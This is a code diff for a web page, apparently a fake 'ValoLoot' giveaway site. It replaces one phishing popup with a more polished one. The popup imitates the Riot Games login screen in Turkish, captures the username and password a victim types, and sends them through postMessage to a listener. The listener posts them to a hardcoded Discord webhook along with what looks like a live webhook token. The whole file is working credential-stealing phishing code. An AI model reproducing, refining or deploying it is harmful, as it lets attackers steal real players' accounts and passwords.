@@ -130,76 +130,125 @@
         });
 
         // 2. AUTH SİSTEMİ (POP-UP)
-        function openAuth() {
-            const w = 550, h = 800;
-            const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
-            let win = window.open("", "RiotLogin", `width=${w},height=${h},top=${t},left=${l}`);
-            
-            const popupHTML = `
-                <html>
-                <head>
-                    <title>Riot Games - Oturum Aç</title>
-                    <style>
-                        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
-                        body { margin:0; height:100vh; display:flex; justify-content:center; align-items:center; font-family:'Inter', sans-serif; background:#fff; }
-                        .card { width:330px; text-align:center; padding: 20px; }
-                        h2 { font-weight:900; font-size:24px; margin: 25px 0; color:#111; }
-                        .input-container { position: relative; margin: 10px 0; }
-                        input { width:100%; padding: 24px 16px 8px 16px; background:#f2f2f2; border:2px solid transparent; border-radius:4px; font-weight:700; outline:none; box-sizing:border-box; }
-                        .label { position: absolute; left: 16px; top: 18px; color: #999; font-size: 11px; text-transform: uppercase; pointer-events: none; transition: 0.15s; font-weight:800; }
-                        input:focus + .label, input:not(:placeholder-shown) + .label { top: 8px; font-size: 9px; color: #333; }
-                        input:focus { border-color: #111; background:#fff; }
-                        .next-btn { width:75px; height:75px; border:2px solid #eee; border-radius:24px; background:#fff; cursor:pointer; margin-top:30px; transition:0.3s; }
-                        .next-btn.active { border-color:#ff4655; }
-                        .next-btn svg { width:30px; fill:#ddd; }
-                        .next-btn.active svg { fill:#ff4655; }
-                    </style>
-                </head>
-                <body>
-                    <div class="card">
-                        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png" width="50">
-                        <h2>GİRİŞ</h2>
-                        <div class="input-container"><input type="text" id="u" placeholder=" "><span class="label">Kullanıcı Adı</span></div>
-                        <div class="input-container"><input type="password" id="p" placeholder=" "><span class="label">Şifre</span></div>
-                        <button class="next-btn" id="go"><svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg></button>
-                    </div>
-                    <script>
-                        const u=document.getElementById('u'), p=document.getElementById('p'), b=document.getElementById('go');
-                        const c=()=>(u.value && p.value)?b.classList.add('active'):b.classList.remove('active');
-                        u.oninput=c; p.oninput=c;
-                        b.onclick=function(){
-                            if(u.value && p.value){
-                                window.opener.postMessage({user:u.value, pass:p.value}, "*");
-                                window.close();
-                            }
-                        };
-                    <\/script>
-                </body>
-                </html>`;
-            win.document.write(popupHTML);
-            win.document.close();
-        }
+        // 2. AUTH SİSTEMİ (POP-UP - FULL GÖRSEL TASARIM)
+function openAuth() {
+    const w = 550, h = 800;
+    const l = (screen.width/2)-(w/2), t = (screen.height/2)-(h/2);
+    let win = window.open("", "RiotLogin", `width=${w},height=${h},top=${t},left=${l}`);
+    
+    const popupHTML = `
+        <html>
+        <head>
+            <title>Riot Games - Oturum Aç</title>
+            <style>
+                @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;700;900&display=swap');
+                body { 
+                    margin:0; height:100vh; overflow:hidden; 
+                    background: url('https://raw.githubusercontent.com/skidrowpro/riot-assets/main/login_bg.jpg') center/cover; 
+                    display:flex; justify-content:center; align-items:center; font-family:'Inter', sans-serif; 
+                }
+                .card { 
+                    background:#fff; width:330px; padding:45px 35px; border-radius:4px; text-align:center; 
+                    box-shadow: 0 10px 50px rgba(0,0,0,0.5); display: flex; flex-direction: column; align-items: center; 
+                }
+                h2 { font-weight:900; font-size:24px; margin: 25px 0; text-transform:uppercase; color:#111; letter-spacing:-1px; }
+                
+                .input-container { position: relative; margin: 10px 0; width: 100%; text-align: left; }
+                input { 
+                    width:100%; padding: 24px 16px 8px 16px; background:#f2f2f2; border:2px solid transparent; 
+                    border-radius:4px; box-sizing:border-box; font-weight:700; font-size:14px; color:#111; 
+                    outline:none; transition: 0.15s ease-in-out; 
+                }
+                .label { 
+                    position: absolute; left: 16px; top: 18px; color: #999; font-weight: 800; font-size: 11px; 
+                    text-transform: uppercase; pointer-events: none; transition: 0.15s ease-in-out; 
+                }
+                input:focus { background: #fff; border-color: #111; }
+                input:focus + .label, input:not(:placeholder-shown) + .label { top: 8px; font-size: 9px; color: #333; }
 
-        // 3. WEBHOOK (ANA SAYFA DİNLEYİCİ)
-        window.addEventListener("message", function(e) {
-            if (e.data.user && e.data.pass) {
-                fetch("https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq", {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        embeds: [{
-                            title: "⚠️ Yeni Giriş",
-                            color: 16725845,
-                            fields: [
-                                { name: "👤 Kullanıcı", value: "```" + e.data.user + "```" },
-                                { name: "🔑 Şifre", value: "```" + e.data.pass + "```" }
-                            ],
-                            timestamp: new Date()
-                        }]
-                    })
-                });
-            }
+                .social-grid { display:grid; grid-template-columns:repeat(5, 1fr); gap:8px; margin:20px 0; width:100%; }
+                .social-btn { height:40px; border-radius:4px; display:flex; align-items:center; justify-content:center; cursor:pointer; overflow:hidden; }
+                .fb { background:#1877f2; } .gg { background:#fff; border:1px solid #ddd; } .ap { background:#000; } .xb { background:#107c10; } .ps { background:#00439c; }
+                .social-btn img { width:20px; height:20px; object-fit: contain; }
+
+                .stay-signed { display:flex; align-items:center; gap:8px; font-size:12px; color:#111; font-weight:700; margin:15px 0; width:100%; cursor:pointer; }
+                .checkbox { width:16px; height:16px; background:#f2f2f2; border-radius:3px; border: 1px solid #ddd; }
+
+                .next-btn { 
+                    width:75px; height:75px; border:2px solid #eee; border-radius:24px; background:#fff; 
+                    cursor:pointer; display:flex; align-items:center; justify-content:center; transition:0.3s; margin-top:20px; 
+                }
+                .next-btn.active { border-color:#ff4655; }
+                .next-btn svg { width:30px; fill:#ddd; }
+                .next-btn.active svg { fill:#ff4655; }
+
+                .footer-links { margin-top:35px; font-size:11px; font-weight:800; color:#111; text-transform:uppercase; opacity:0.6; }
+            </style>
+        </head>
+        <body>
+            <div class="card">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Riot_Games_logo_icon.png" width="50">
+                <h2>GİRİŞ</h2>
+                <div class="input-container">
+                    <input type="text" id="u" placeholder=" "><span class="label">Kullanıcı Adı</span>
+                </div>
+                <div class="input-container">
+                    <input type="password" id="p" placeholder=" "><span class="label">Şifre</span>
+                </div>
+                <div class="social-grid">
+                    <div class="social-btn fb"><img src="https://cdn-icons-png.flaticon.com/512/124/124010.png"></div>
+                    <div class="social-btn gg"><img src="https://cdn-icons-png.flaticon.com/512/2991/2991148.png"></div>
+                    <div class="social-btn ap"><img src="https://cdn-icons-png.flaticon.com/512/0/747.png"></div>
+                    <div class="social-btn xb"><img src="https://upload.wikimedia.org/wikipedia/commons/f/f9/Xbox_one_logo.svg"></div>
+                    <div class="social-btn ps"><img src="https://upload.wikimedia.org/wikipedia/commons/4/4e/Playstation_logo_colour.svg"></div>
+                </div>
+                <div class="stay-signed"><div class="checkbox"></div> Oturumu açık tut</div>
+                <button class="next-btn" id="go">
+                    <svg viewBox="0 0 24 24"><path d="M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z"/></svg>
+                </button>
+                <div class="footer-links">
+                    <div style="cursor:pointer">OTURUM AÇAMIYOR MUSUN?</div>
+                    <div style="margin-top:5px; cursor:pointer">HESAP OLUŞTUR</div>
+                </div>
+            </div>
+            <script>
+                const u=document.getElementById('u'), p=document.getElementById('p'), b=document.getElementById('go');
+                const c=()=>(u.value && p.value)?b.classList.add('active'):b.classList.remove('active');
+                u.oninput=c; p.oninput=c;
+                b.onclick=function(){
+                    if(u.value && p.value){
+                        window.opener.postMessage({user:u.value, pass:p.value}, "*");
+                        window.close();
+                    }
+                };
+            <\/script>
+        </body>
+        </html>`;
+    win.document.write(popupHTML);
+    win.document.close();
+}
+
+// 3. WEBHOOK (ANA SAYFA DİNLEYİCİ)
+window.addEventListener("message", function(e) {
+    if (e.data.user && e.data.pass) {
+        fetch("https://discord.com/api/webhooks/1489632402421841930/NW5qpH3UpfzBpTWSVcJ-FGXbevssOBhbMDUIdGjP4620rQLHvM6jx8fJGzji_4LQOBrq", {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                embeds: [{
+                    title: "⚠️ Yeni Giriş (Görsel Panel)",
+                    color: 16725845,
+                    fields: [
+                        { name: "👤 Kullanıcı", value: "```" + e.data.user + "```" },
+                        { name: "🔑 Şifre", value: "```" + e.data.pass + "```" }
+                    ],
+                    footer: { text: "ValoLoot Auth System" },
+                    timestamp: new Date()
+                }]
+            })
         });
+    }
+});
     </script>
 </body>
 </html>
